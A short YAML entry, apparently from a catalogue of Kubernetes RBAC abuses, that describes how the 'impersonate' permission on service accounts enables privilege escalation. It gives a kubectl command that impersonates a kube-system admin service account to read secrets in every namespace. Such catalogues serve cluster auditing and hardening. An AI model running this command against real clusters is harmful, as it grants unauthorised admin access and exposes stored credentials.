---
verb: "impersonate"
resource: "serviceaccounts"
description: "Impersonate service accounts in Kubernetes"
abuses:
  - type: "Privilege Escalation"
    description: "Impersonate privileged service accounts to gain elevated cluster access"
    code: |
      # Impersonate cluster admin service account
      kubectl --as=system:serviceaccount:kube-system:admin get secrets --all-namespaces
---